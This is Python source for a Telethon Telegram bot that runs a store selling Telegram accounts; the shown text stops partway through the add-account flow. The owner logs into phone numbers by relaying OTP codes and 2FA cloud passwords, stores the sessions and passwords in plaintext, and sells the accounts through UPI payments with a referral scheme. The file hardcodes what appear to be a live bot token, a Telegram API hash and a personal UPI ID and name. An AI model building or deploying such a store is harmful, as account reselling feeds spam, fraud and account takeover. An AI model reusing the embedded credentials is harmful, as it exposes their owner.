import os
import sqlite3
import asyncio
import logging
import traceback
import re
import qrcode
import urllib.parse
import urllib.request
from io import BytesIO
from telethon import TelegramClient, events, Button, errors, types


# ------------------------------------------------------------------
# PREMIUM CUSTOM EMOJI
# Uses the existing Premium Emoji IDs plus a few extra IDs already
# present in emoji(1).json. Only outgoing HTML message text is changed.
# ------------------------------------------------------------------
from telethon.extensions import html as _telethon_html

PREMIUM_EMOJI_MAP = {'⚠️': '6008233706039284019', '🖥️': '4956324463525233747', '✏️': '5956143844457189176', '🗑️': '4958534924278694938', '🏷️': '5371012356342048641', '✅': '5370736473412757000', '👑': '5231409950533644591', '👋': '4956276016294135071', '💰': '5434085514451895232', '🔥': '5348130694734308530', '🚫': '4956337889593000947', '📱': '5927111081011974472', '⚡': '5427113717378595836', '📊': '4958506272551863292', '➕': '4956507094124594921', '🎁': '5371017742231036968', '📝': '6010292709066019210', '✨': '5458687246037175705', '❌': '5929358014627713883', '💵': '5931730919634244412', '📸': '6231107453178611892', '🆔': '5818885490065017876', '🔐': '5821453562680448557', '👤': '6035070298087231243', '🚀': '5800956853462504394', '🔑': '5229153645299245972', '🔗': '4958689671950369798', '🎉': '4956596167451346576', '⏳': '6010111371251815589', '➖': '5789863180570202418', '🛒': '5803157955482227929', '🤖': '5458917829946397687', '📦': '5458790973792340888', '💳': '5460959824902638811', '❤️': '5783157259152397008', '💎': '6086778246882399112', '👍': '6089313931149448495', '👎': '5782671841948603573', '😂': '5782741660936966676', '😎': '6093639774965338848', '⭐': '6244496562752331516', '💖': '4958577444454925201', '🎮': '6246610665914505571', '📣': '6095891759462617671', '🔔': '6093852083788715042', '🌹': '5783036501851902672'}

def _premiumize_text(text):
    if not isinstance(text, str):
        return text
    parts = re.split(r'(<tg-emoji\b[^>]*>.*?</tg-emoji>)', text, flags=re.S)
    for i in range(0, len(parts), 2):
        chunk = parts[i]
        for emoji, emoji_id in sorted(PREMIUM_EMOJI_MAP.items(), key=lambda x: len(x[0]), reverse=True):
            chunk = chunk.replace(emoji, f'<tg-emoji emoji-id="{emoji_id}">{emoji}</tg-emoji>')
        parts[i] = chunk
    return ''.join(parts)

_original_html_parse = _telethon_html.parse

def _premium_html_parse(text, *args, **kwargs):
    return _original_html_parse(_premiumize_text(text), *args, **kwargs)

_telethon_html.parse = _premium_html_parse

# ----------------------------
# MASKING FUNCTIONS
# ----------------------------
def mask_otp(otp):
    otp = str(otp)
    if len(otp) <= 2:
        return "**"
    return otp[0] + "*" * (len(otp) - 2) + otp[-1]

def mask_phone(phone):
    phone = str(phone)
    if len(phone) <= 6:
        return "*" * len(phone)
    return phone[:5] + "*" * (len(phone) - 8) + phone[-3:]

# ------------------------------------------------------------------
# CONFIGURATION
# ------------------------------------------------------------------
BOT_TOKEN = os.getenv("BOT_TOKEN", "8660177954:AAEih7tJ7PxoBNN-VWgrrhnX6ffcUBaHDas")
OWNER_IDS = [8174685604]
API_ID = int(os.getenv("API_ID", "32110493"))
API_HASH = os.getenv("API_HASH", "1825b1ce386571cc7ec13bfb67154b2e")
SESSIONS_DIR = "MyTelethon"
DB_PATH = 'bot_database.db'
SOLD_CHANNEL = "https://t.me/Trusted20170"
# Force-join channel. Bot must be able to access this channel to verify membership.
FORCE_CHANNEL = os.getenv("FORCE_CHANNEL", SOLD_CHANNEL)
FORCE_CHANNEL_URL = os.getenv("FORCE_CHANNEL_URL", "https://t.me/Trusted20170")

UPI_ID = "riteshgupta0192@fam"
UPI_NAME = "Ritesh Kumar"
SUPPORT_USERNAME = "@VORTEXKINGS"

SERVERS = ["Server 1", "Server 2"]

MIN_DEPOSIT = 10.0

os.makedirs(SESSIONS_DIR, exist_ok=True)
os.makedirs("qr_temp", exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler("bot.log"), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# ------------------------------------------------------------------
# DATABASE
# ------------------------------------------------------------------
def get_db_connection():
    conn = sqlite3.connect(DB_PATH, timeout=1000)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL;")
    return conn

def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()

    cursor.execute('''CREATE TABLE IF NOT EXISTS users
                      (user_id INTEGER PRIMARY KEY, balance REAL DEFAULT 0.0, is_owner INTEGER DEFAULT 0)''')

    cursor.execute('''CREATE TABLE IF NOT EXISTS accounts
                      (id INTEGER PRIMARY KEY AUTOINCREMENT, phone TEXT UNIQUE, price REAL,
                       status TEXT DEFAULT 'available', country TEXT, password TEXT, server TEXT DEFAULT 'Server 1')''')

    cursor.execute('''CREATE TABLE IF NOT EXISTS settings
                      (key TEXT PRIMARY KEY, value TEXT)''')

    cursor.execute("""
    CREATE TABLE IF NOT EXISTS deposits (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        utr TEXT,
        amount REAL,
        status TEXT DEFAULT 'pending',
        reject_reason TEXT,
        screenshot TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
    """)

    cursor.execute("PRAGMA table_info(users)")
    u_cols = [col[1] for col in cursor.fetchall()]
    if 'referred_by' not in u_cols:
        cursor.execute("ALTER TABLE users ADD COLUMN referred_by INTEGER DEFAULT NULL")
    if 'referral_count' not in u_cols:
        cursor.execute("ALTER TABLE users ADD COLUMN referral_count INTEGER DEFAULT 0")
    if 'referral_earnings' not in u_cols:
        cursor.execute("ALTER TABLE users ADD COLUMN referral_earnings REAL DEFAULT 0.0")
    if 'referral_credited' not in u_cols:
        cursor.execute("ALTER TABLE users ADD COLUMN referral_credited INTEGER DEFAULT 0")
    if 'is_banned' not in u_cols:
        cursor.execute("ALTER TABLE users ADD COLUMN is_banned INTEGER DEFAULT 0")

    cursor.execute("PRAGMA table_info(accounts)")
    existing_columns = [col[1] for col in cursor.fetchall()]
    if 'country' not in existing_columns:
        cursor.execute("ALTER TABLE accounts ADD COLUMN country TEXT")
    if 'password' not in existing_columns:
        cursor.execute("ALTER TABLE accounts ADD COLUMN password TEXT")
    if 'server' not in existing_columns:
        cursor.execute("ALTER TABLE accounts ADD COLUMN server TEXT DEFAULT 'Server 1'")

    cursor.execute("PRAGMA table_info(deposits)")
    dep_cols = [col[1] for col in cursor.fetchall()]
    if 'reject_reason' not in dep_cols:
        cursor.execute("ALTER TABLE deposits ADD COLUMN reject_reason TEXT")
    if 'status' not in dep_cols:
        cursor.execute("ALTER TABLE deposits ADD COLUMN status TEXT DEFAULT 'pending'")
    if 'screenshot' not in dep_cols:
        cursor.execute("ALTER TABLE deposits ADD COLUMN screenshot TEXT")

    cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('default_price', '100.0')")
    cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('referral_bonus', '10.0')")
    conn.commit()
    conn.close()
    logger.info("✅ Database initialized")

def init_user(user_id):
    try:
        conn = get_db_connection()
        conn.execute("INSERT OR IGNORE INTO users (user_id, balance, is_owner) VALUES (?, 0.0, ?)",
                     (user_id, 1 if user_id in OWNER_IDS else 0))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"DB Error (init_user): {e}")

def user_exists(user_id):
    conn = get_db_connection()
    row = conn.execute("SELECT 1 FROM users WHERE user_id=?", (user_id,)).fetchone()
    conn.close()
    return row is not None

def get_user_balance(user_id):
    conn = get_db_connection()
    row = conn.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,)).fetchone()
    conn.close()
    return row['balance'] if row else 0.0

def update_user_balance(user_id, amount):
    try:
        conn = get_db_connection()
        conn.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        logger.error(f"DB Error (update_balance): {e}")
        return False

def is_user_banned(user_id):
    conn = get_db_connection()
    row = conn.execute("SELECT is_banned FROM users WHERE user_id=?", (user_id,)).fetchone()
    conn.close()
    if not row:
        return False
    return bool(row['is_banned'])

def set_user_banned(user_id, banned):
    conn = get_db_connection()
    conn.execute("UPDATE users SET is_banned=? WHERE user_id=?", (1 if banned else 0, user_id))
    conn.commit()
    conn.close()

def get_referral_stats(user_id):
    conn = get_db_connection()
    row = conn.execute(
        "SELECT referral_count, referral_earnings FROM users WHERE user_id=?",
        (user_id,)
    ).fetchone()
    conn.close()
    if not row:
        return 0, 0.0
    return (row['referral_count'] or 0), (row['referral_earnings'] or 0.0)

def set_referred_by(user_id, referrer_id):
    conn = get_db_connection()
    conn.execute("UPDATE users SET referred_by=? WHERE user_id=?", (referrer_id, user_id))
    conn.commit()
    conn.close()

def credit_referrer(referrer_id, bonus):
    conn = get_db_connection()
    conn.execute(
        "UPDATE users SET balance = balance + ?, referral_count = referral_count + 1, "
        "referral_earnings = referral_earnings + ? WHERE user_id = ?",
        (bonus, bonus, referrer_id)
    )
    conn.commit()
    conn.close()

def get_referral_bonus():
    conn = get_db_connection()
    row = conn.execute("SELECT value FROM settings WHERE key = 'referral_bonus'").fetchone()
    conn.close()
    return float(row['value']) if row else 10.0

def process_pending_referral(user_id):
    """Credit a pending referral exactly once after the referred user is verified/allowed."""
    conn = get_db_connection()
    row = conn.execute(
        "SELECT referred_by, referral_credited FROM users WHERE user_id=?",
        (user_id,)
    ).fetchone()

    if not row or not row['referred_by'] or row['referral_credited']:
        conn.close()
        return None

    referrer_id = int(row['referred_by'])
    if referrer_id == user_id or referrer_id in OWNER_IDS:
        conn.close()
        return None

    referrer = conn.execute(
        "SELECT user_id FROM users WHERE user_id=?",
        (referrer_id,)
    ).fetchone()
    if not referrer:
        conn.close()
        return None

    bonus = get_referral_bonus()

    # Mark the referred user first in the same transaction so a repeated
    # callback cannot credit the same referral twice.
    conn.execute(
        "UPDATE users SET referral_credited=1 WHERE user_id=? AND referral_credited=0",
        (user_id,)
    )
    if conn.total_changes != 1:
        conn.rollback()
        conn.close()
        return None

    conn.execute(
        "UPDATE users SET balance=balance+?, referral_count=referral_count+1, "
        "referral_earnings=referral_earnings+? WHERE user_id=?",
        (bonus, bonus, referrer_id)
    )
    conn.commit()
    conn.close()
    return referrer_id, bonus


def set_referral_bonus(amount):
    conn = get_db_connection()
    conn.execute("INSERT OR REPLACE INTO settings (key, value) VALUES ('referral_bonus', ?)", (str(amount),))
    conn.commit()
    conn.close()
    return True

def get_stats():
    conn = get_db_connection()
    u_count = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
    a_count = conn.execute("SELECT COUNT(*) FROM accounts WHERE status = 'available'").fetchone()[0]
    s_count = conn.execute("SELECT COUNT(*) FROM accounts WHERE status = 'sold'").fetchone()[0]
    p_count = conn.execute("SELECT COUNT(*) FROM deposits WHERE status = 'pending'").fetchone()[0]
    conn.close()
    return u_count, a_count, s_count, p_count

def get_default_price():
    conn = get_db_connection()
    row = conn.execute("SELECT value FROM settings WHERE key = 'default_price'").fetchone()
    conn.close()
    return float(row['value']) if row else 100.0

def set_default_price(price):
    conn = get_db_connection()
    conn.execute("INSERT OR REPLACE INTO settings (key, value) VALUES ('default_price', ?)", (str(price),))
    conn.commit()
    conn.close()
    return True

def has_pending_deposit(user_id):
    conn = get_db_connection()
    row = conn.execute("SELECT 1 FROM deposits WHERE user_id=? AND status='pending'", (user_id,)).fetchone()
    conn.close()
    return row is not None

# ------------------------------------------------------------------
# KEYBOARDS
# ------------------------------------------------------------------
def get_owner_keyboard():
    return [
        [Button.text("➕ ADD ACC"),     Button.text("💰 ADD FUND")],
        [Button.text("🏷️ PRICE"),      Button.text("✏️ EDIT ACC")],
        [Button.text("🗑️ REMOVE"),     Button.text("📊 STATS")],
        [Button.text("🎁 REF BONUS"),  Button.text("📢 BROADCAST")],
    ]

def get_user_keyboard():
    return [
        [Button.text("🛒 BUY"),        Button.text("💳 ADD FUND")],
        [Button.text("👤 ACCOUNT"),    Button.text("🎁 REFERRAL")],
        [Button.text("🆘 SUPPORT")],
    ]

def cancel_button():
    return [Button.text("❌ Cancel")]

def server_select_buttons(prefix):
    return [
        [Button.inline("SERVER - 1", data=f"{prefix}_Server 1")],
        [Button.inline("SERVER - 2", data=f"{prefix}_Server 2")],
        [Button.inline("🔙 BACK", b"main_menu")],
    ]

# ------------------------------------------------------------------
# QR GENERATOR (WITH FALLBACK)
# ------------------------------------------------------------------
def generate_qr(amount):
    upi_url = f"upi://pay?pa={UPI_ID}&pn={UPI_NAME}&am={amount}&cu=INR"
    
    try:
        qr = qrcode.QRCode(version=1, box_size=10, border=3)
        qr.add_data(upi_url)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        buffer = BytesIO()
        img.save(buffer, format="PNG")
        buffer.seek(0)
        buffer.name = f"qr_{amount}.png"
        return buffer
    except Exception as e:
        logger.warning(f"PIL Error: {e}. Falling back to external QR API.")
        encoded_url = urllib.parse.quote(upi_url)
        api_url = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={encoded_url}"
        
        req = urllib.request.Request(api_url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req) as response:
            img_data = response.read()
            
        buffer = BytesIO(img_data)
        buffer.name = f"qr_{amount}.png"
        return buffer

# ------------------------------------------------------------------
# FORCE JOIN CHECK
# ------------------------------------------------------------------
async def check_force_join(bot, user_id):
    if user_id in OWNER_IDS:
        return True

    try:
        await bot.get_permissions(FORCE_CHANNEL, user_id)
        return True
    except errors.UserNotParticipantError:
        return False
    except Exception as e:
        logger.error(f"Force join check failed for user {user_id}: {e}")
        return False

    return True

    try:
        # Telethon returns UserNotParticipantError when the user has not joined.
        perms = await bot.get_permissions(FORCE_CHANNEL, user_id)

        # Explicitly accept only an actual channel member/admin/owner.
        participant = getattr(perms, "participant", None)
        if participant is None:
            return False

        # Left/kicked users must not pass the check.
        if isinstance(participant, (types.ChannelParticipantLeft, types.ChannelParticipantBanned)):
            return False

        return True

    except errors.UserNotParticipantError:
        return False
    except (errors.ChannelPrivateError, errors.UsernameNotOccupiedError, errors.ChannelInvalidError) as e:
        # Configuration errors must NOT bypass force join.
        logger.error(f"Force channel configuration error: {e}")
        return False
    except Exception as e:
        # Unknown/API errors also fail closed for force-join security.
        logger.warning(f"Force join check failed for user {user_id}: {e}")
        return False


def force_join_message():
    return (
        "<b>🔒 JOIN REQUIRED</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Please join our channel first to use this bot.\n\n"
        "After joining, tap <b>✅ I HAVE JOINED</b>."
    )


def force_join_buttons():
    return [
        [Button.url("📢 JOIN CHANNEL", FORCE_CHANNEL_URL)],
        [Button.inline("✅ I HAVE JOINED", b"check_force_join")]
    ]


# ------------------------------------------------------------------
# MAIN BOT
# ------------------------------------------------------------------
async def main():
    bot = TelegramClient("bot_session", API_ID, API_HASH)
    await bot.start(bot_token=BOT_TOKEN)

    try:
        me = await bot.get_me()
        BOT_USERNAME = me.username
    except Exception:
        BOT_USERNAME = "YourBot"

    user_states = {}
    otp_clients = {}

    # -------------------- /start --------------------
    @bot.on(events.NewMessage(pattern='/start'))
    async def start_handler(event):
        user_id = event.sender_id

        # Parse referral BEFORE force-join so the referral is not lost when
        # the new user opens the link before joining the required channel.
        referrer_id = None
        args = event.raw_text.split()
        if len(args) > 1 and args[1].startswith("ref_"):
            try:
                referrer_id = int(args[1].replace("ref_", "").strip())
                if referrer_id == user_id or referrer_id in OWNER_IDS:
                    referrer_id = None
            except Exception:
                referrer_id = None

        is_new = not user_exists(user_id)
        init_user(user_id)

        # Save the referral as pending. It will be credited only after the
        # referred user successfully passes the force-join check.
        if is_new and referrer_id and user_exists(referrer_id):
            conn = get_db_connection()
            existing = conn.execute(
                "SELECT referred_by FROM users WHERE user_id=?", (user_id,)
            ).fetchone()
            if existing and not existing['referred_by']:
                conn.execute(
                    "UPDATE users SET referred_by=? WHERE user_id=?",
                    (referrer_id, user_id)
                )
                conn.commit()
            conn.close()

        # 🔒 FORCE JOIN CHECK
        if not await check_force_join(bot, user_id):
            await event.respond(
                force_join_message(),
                buttons=force_join_buttons(),
                parse_mode="html"
            )
            return

        # Credit pending referral after successful force-join verification.
        referral_result = process_pending_referral(user_id)
        if referral_result:
            credited_referrer, bonus = referral_result
            try:
                await bot.send_message(
                    credited_referrer,
                    "<b>🎉 NEW REFERRAL JOINED!</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    f"👤 User: <code>{user_id}</code>\n"
                    f"💰 Bonus Credited: <code>+₹{bonus}</code>\n"
                    "━━━━━━━━━━━━━━━━━━━━",
                    parse_mode='html'
                )
            except Exception:
                pass

        # ✅ BAN CHECK
        if user_exists(user_id) and is_user_banned(user_id) and user_id not in OWNER_IDS:
            await event.respond(
                "<b>🚫 YOU ARE BANNED</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "You have been banned from using this bot.\n"
                f"Contact support if you think this is a mistake: {SUPPORT_USERNAME}",
                parse_mode='html'
            )
            return

        if referral_result:
            try:
                await event.respond(
                    "<b>🎁 Referral Applied!</b>\n"
                    "Your referral reward has been credited to the referrer.",
                    parse_mode='html'
                )
            except Exception:
                pass

        referral_link = f"https://t.me/{BOT_USERNAME}?start=ref_{user_id}"
        welcome_msg = (
            "<b>👑 PREMIUM TELEGRAM ACCOUNT STORE</b>\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "⚡ Instant Account Delivery\n"
            "🔐 Secure & Verified Accounts\n"
            "💰 Fast & Easy Payments\n"
            "📩 Automatic OTP Forwarding\n"
            "🎁 Refer & Earn Rewards\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔗 <b>Your Referral Link:</b>\n"
            f"<code>{referral_link}</code>\n\n"
            "<i>Share your link with friends and earn rewards!</i>"
        )

        if user_id in OWNER_IDS:
            await event.respond(
                "<b>👋 Welcome Boss!</b>\n\nAdmin Dashboard is ready.",
                buttons=get_owner_keyboard(), parse_mode='html'
            )
        else:
            await event.respond(welcome_msg, buttons=get_user_keyboard(), parse_mode='html')

    # -------------------- Message Handler --------------------
    @bot.on(events.NewMessage)
    async def message_handler(event):
        user_id = event.sender_id
        text = event.raw_text

        # 🔒 FORCE JOIN CHECK (owners bypass)
        # Skip commands used by owners and allow the join-check callback below.
        if user_id not in OWNER_IDS and not await check_force_join(bot, user_id):
            await event.respond(
                force_join_message(),
                buttons=force_join_buttons(),
                parse_mode="html"
            )
            return

        state_info = user_states.get(user_id, {})
        state = state_info.get('state')

        # Cancel
        if text in ["/cancel", "❌ Cancel", "❌ Cancel Operation"]:
            client_ref = state_info.get("client")
            if client_ref:
                try:
                    await client_ref.disconnect()
                except Exception:
                    pass
            user_states.pop(user_id, None)
            kb = get_owner_keyboard() if user_id in OWNER_IDS else get_user_keyboard()
            await event.respond("<b>⚠️ Operation Cancelled.</b>", buttons=kb, parse_mode='html')
            return

        # ==================== OWNER SIDE ====================
        if user_id in OWNER_IDS:

            # ✅ /ban userid
            if text.startswith("/ban"):
                parts = text.split()
                if len(parts) < 2:
                    await event.respond(
                        "<b>❌ Usage:</b> <code>/ban userid</code>",
                        parse_mode='html'
                    )
                    return
                try:
                    target_id = int(parts[1])
                except ValueError:
                    await event.respond("<b>❌ Invalid user ID.</b>", parse_mode='html')
                    return

                init_user(target_id)
                set_user_banned(target_id, True)
                await event.respond(
                    "<b>🚫 User Banned</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    f"👤 User ID: <code>{target_id}</code>\n"
                    "━━━━━━━━━━━━━━━━━━━━",
                    buttons=get_owner_keyboard(), parse_mode='html'
                )
                try:
                    await bot.send_message(
                        target_id,
                        "<b>🚫 YOU HAVE BEEN BANNED</b>\n"
                        "━━━━━━━━━━━━━━━━━━━━\n"
                        f"Contact support: {SUPPORT_USERNAME}",
                        parse_mode='html'
                    )
                except Exception:
                    pass
                return

            # ✅ /unban userid
            if text.startswith("/unban"):
                parts = text.split()
                if len(parts) < 2:
                    await event.respond(
                        "<b>❌ Usage:</b> <code>/unban userid</code>",
                        parse_mode='html'
                    )
                    return
                try:
                    target_id = int(parts[1])
                except ValueError:
                    await event.respond("<b>❌ Invalid user ID.</b>", parse_mode='html')
                    return

                init_user(target_id)
                set_user_banned(target_id, False)
                await event.respond(
                    "<b>✅ User Unbanned</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    f"👤 User ID: <code>{target_id}</code>\n"
                    "━━━━━━━━━━━━━━━━━━━━",
                    buttons=get_owner_keyboard(), parse_mode='html'
                )
                try:
                    await bot.send_message(
                        target_id,
                        "<b>✅ YOU HAVE BEEN UNBANNED</b>\n"
                        "━━━━━━━━━━━━━━━━━━━━\n"
                        "You can now use the bot again.",
                        parse_mode='html'
                    )
                except Exception:
                    pass
                return

            # ✅ /reduce amount userid
            if text.startswith("/reduce"):
                parts = text.split()
                if len(parts) < 3:
                    await event.respond(
                        "<b>❌ Usage:</b> <code>/reduce amount userid</code>",
                        parse_mode='html'
                    )
                    return
                try:
                    amount = float(parts[1])
                    target_id = int(parts[2])
                except ValueError:
                    await event.respond(
                        "<b>❌ Invalid format. Use:</b> <code>/reduce amount userid</code>",
                        parse_mode='html'
                    )
                    return

                if amount <= 0:
                    await event.respond("<b>❌ Amount must be greater than 0.</b>", parse_mode='html')
                    return

                init_user(target_id)
                current_balance = get_user_balance(target_id)

                if current_balance < amount:
                    await event.respond(
                        "<b>❌ Insufficient Balance</b>\n"
                        "━━━━━━━━━━━━━━━━━━━━\n"
                        f"👤 User: <code>{target_id}</code>\n"
                        f"💰 User Balance: <code>₹{current_balance}</code>\n"
                        f"➖ Requested: <code>₹{amount}</code>\n"
                        "━━━━━━━━━━━━━━━━━━━━\n"
                        f"<i>User me itna nahi he, sirf itna hi he: ₹{current_balance}</i>",
                        buttons=get_owner_keyboard(), parse_mode='html'
                    )
                    return

                update_user_balance(target_id, -amount)
                new_balance = get_user_balance(target_id)

                await event.respond(
                    "<b>✅ Balance Reduced</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    f"👤 User: <code>{target_id}</code>\n"
                    f"➖ Reduced: <code>₹{amount}</code>\n"
                    f"💰 New Balance: <code>₹{new_balance}</code>\n"
                    "━━━━━━━━━━━━━━━━━━━━",
                    buttons=get_owner_keyboard(), parse_mode='html'
                )
                try:
                    await bot.send_message(
                        target_id,
                        "<b>➖ Funds Deducted</b>\n"
                        "━━━━━━━━━━━━━━━━━━━━\n"
                        f"💰 Amount: <code>₹{amount}</code>\n"
                        f"💰 New Balance: <code>₹{new_balance}</code>\n"
                        "━━━━━━━━━━━━━━━━━━━━",
                        parse_mode='html'
                    )
                except Exception:
                    pass
                return

            if text == "➕ ADD ACC":
                user_states[user_id] = {'state': 'AWAITING_PHONE'}
                await event.respond(
                    "<b>📱 Adding New Account</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    "Send the phone number with country code.\n\n"
                    "Example: <code>+919876543210</code>",
                    buttons=cancel_button(), parse_mode='html'
                )
                return

            elif text == "💰 ADD FUND":
                user_states[user_id] = {'state': 'AWAITING_ADD_FUND_UID'}
                await event.respond(
                    "<b>💰 Add Funds to User</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    "Enter the <b>User ID</b> to credit:",
                    buttons=cancel_button(), parse_mode='html'
                )
                return

            elif text == "📊 STATS":
                u_count, a_count, s_count, p_count = get_stats()
                await event.respond(
                    "<b>📊 GLOBAL STATISTICS</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    f"👥 Users: <code>{u_count}</code>\n"
                    f"📦 Available: <code>{a_count}</code>\n"
                    f"✅ Sold: <code>{s_count}</code>\n"
                    f"⏳ Pending Dep: <code>{p_count}</code>\n"
                    f"🎁 Ref Bonus: <code>₹{get_referral_bonus()}</code>\n"
                    "━━━━━━━━━━━━━━━━━━━━",
                    buttons=get_owner_keyboard(), parse_mode='html'
                )
                return

            elif text == "🏷️ PRICE":
                user_states[user_id] = {'state': 'AWAITING_CHANGE_PRICE_PHONE'}
                await event.respond(
                    "<b>🏷️ Change Account Price</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    "Send the account phone number:\n\n"
                    "Example: <code>+919876543210</code>",
                    buttons=cancel_button(), parse_mode='html'
                )
                return

            elif text == "✏️ EDIT ACC":
                user_states[user_id] = {"state": "AWAITING_EDIT_PHONE"}
                await event.respond(
                    "<b>✏️ Edit Account</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    "Send the account phone number:\n\n"
                    "Example: <code>+919876543210</code>",
                    buttons=cancel_button(), parse_mode='html'
                )
                return

            elif text == "🗑️ REMOVE":
                user_states[user_id] = {"state": "AWAITING_REMOVE_PHONE"}
                await event.respond(
                    "<b>🗑️ Remove Account</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    "Send the account phone number to remove:\n\n"
                    "Example: <code>+919876543210</code>",
                    buttons=cancel_button(), parse_mode='html'
                )
                return

            elif text == "🎁 REF BONUS":
                user_states[user_id] = {'state': 'AWAITING_REF_BONUS'}
                await event.respond(
                    "<b>🎁 Set Referral Bonus</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    f"Current Bonus: <code>₹{get_referral_bonus()}</code>\n\n"
                    "Send the new referral bonus amount (INR):",
                    buttons=cancel_button(), parse_mode='html'
                )
                return

            elif text == "📢 BROADCAST":
                user_states[user_id] = {'state': 'AWAITING_ANNOUNCEMENT', 'messages': []}
                await event.respond(
                    "<b>📢 Broadcast Mode</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    "Send any message (Text, Photo, Video, File).\n\n"
                    "✅ Type <b>/done</b> when finished.\n"
                    "❌ Type <b>/cancel</b> to abort.",
                    buttons=cancel_button(), parse_mode='html'
                )
                return

            # ---------- ADD ACC FLOW ----------
            if state == 'AWAITING_PHONE':
                phone = text.strip().replace(" ", "")
                session_file = os.path.join(SESSIONS_DIR, phone.replace("+", ""))
                client = TelegramClient(session_file, API_ID, API_HASH)
                await client.connect()
                try:
                    if not await client.is_user_authorized():
                        sent_code = await client.send_code_request(phone)
                        user_states[user_id] = {
                            'state': 'AWAITING_OTP',
                            'phone': phone,
                            'client': client,
                            'phone_code_hash': sent_code.phone_code_hash
                        }
                        await event.respond(
                            f"<b>📩 OTP Sent!</b>\n"
                            "━━━━━━━━━━━━━━━━━━━━\n"
                            f"Enter the code received on <code>{phone}</code>:",
                            buttons=cancel_button(), parse_mode='html'
                        )
                    else:
                        conn = get_db_connection()
                        conn.execute("INSERT OR IGNORE INTO accounts (phone, price, server) VALUES (?, ?, ?)",
                                     (phone, get_default_price(), "Server 1"))
                        conn.commit()
                        conn.close()
                        await event.respond(
                            f"✅ <b>{phone}</b> is already authorized and added to the store.",
                            buttons=get_owner_keyboard(), parse_mode='html'
                        )
                        user_states.pop(user_id, None)
                        await client.disconnect()
                except Exception as e:
                    await event.respond(f"<b>❌ Error:</b>\n<code>{str(e)}</code>",
                                        buttons=get_owner_keyboard(), parse_mode='html')
                    user_states.pop(user_id, None)
                return

            elif state == 'AWAITING_OTP':
                otp = text.strip()
                try:
                    await state_info['client'].sign_in(
                        state_info['phone'], otp,
                        phone_code_hash=state_info['phone_code_hash']
                    )
                    user_states[user_id] = {
                        "state": "AWAITING_COUNTRY",
                        "phone": state_info["phone"],
                        "client": state_info["client"]
                    }
                    await event.respond(
                        "🌍 <b>Send Country Name</b>\n"
                        "━━━━━━━━━━━━━━━━━━━━\n"
                        "Example: <code>India</code>\n<code>Pakistan</code>\n<code>Bangladesh</code>",
                        buttons=cancel_button(), parse_mode='html'
                    )
                    return
                except errors.SessionPasswordNeededError:
                    user_states[user_id]['state'] = 'AWAITING_2FA'
                    await event.respond(
                        "<b>🔐 2FA Detected</b>\n"
                        "━━━━━━━━━━━━━━━━━━━━\n"
                        "Please enter the Cloud Password:",
                        buttons=cancel_button(), parse_mode='html'
                    )
                except Exception as e:
                    await event.respond(f"<b>❌ Error:</b>\n<code>{str(e)}</code>",
                                        buttons=get_owner_keyboard(), parse_mode='html')
                    user_states.pop(user_id, None)
                return

            elif state == 'AWAITING_2FA':
                try:
                    pwd = text.strip()
                    await state_info['client'].sign_in(password=pwd)
                    user_states[user_id] = {
                        "state": "AWAITING_COUNTRY",
                        "phone": state_info["phone"],
                        "client": state_info["client"],
                        "password": pwd
                    }
                    await event.respond(
                        "🌍 <b>Send Country Name</b>\n"
                        "━━━━━━━━━━━━━━━━━━━━\n"
                        "Example: <code>India</code>\n<code>Pakistan</code>\n<code>Bangladesh</code>",
                        buttons=cancel_button(), parse_mode='html'
                    )
                    return
                except Exception as e:
                    await event.respond(f"<b>❌ 2FA Error:</b>\n<code>{str(e)}</code>",
                                        buttons=get_owner_keyboard(), parse_mode='html')
                    user_states.pop(user_id, None)
                return

            elif state == "AWAITING_COUNTRY":
                country = text.strip()
                user_states[user_id] = {
                    "state": "AWAITING_ACCOUNT_PRICE",
                    "phone": state_info["phone"],
                    "country": country,
                    "client": state_info.get("client"),
                    "password": state_info.get("password")
                }
                await event.respond(
                    f"💰 <b>Enter Price for {country}</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    "Send the price in INR:",
                    buttons=cancel_button(), parse_mode='html'
                )
                return

            elif state == "AWAITING_ACCOUNT_PRICE":
                try:
                    price = float(text)
                    user_states[user_id] = {
                        "state": "AWAITING_ACCOUNT_SERVER",
                        "phone": state_info["phone"],
                        "country": state_info["country"],
                        "client": state_info.get("client"),
                        "password": state_info.get("password"),
                        "price": price
                    }
                    await event.respond(
                        "<b>🖥️ Select Server for this Account</b>\n"
                        "━━━━━━━━━━━━━━━━━━━━\n"
                        "Choose which server to add this account to:",
                        buttons=server_select_buttons("addacc"),
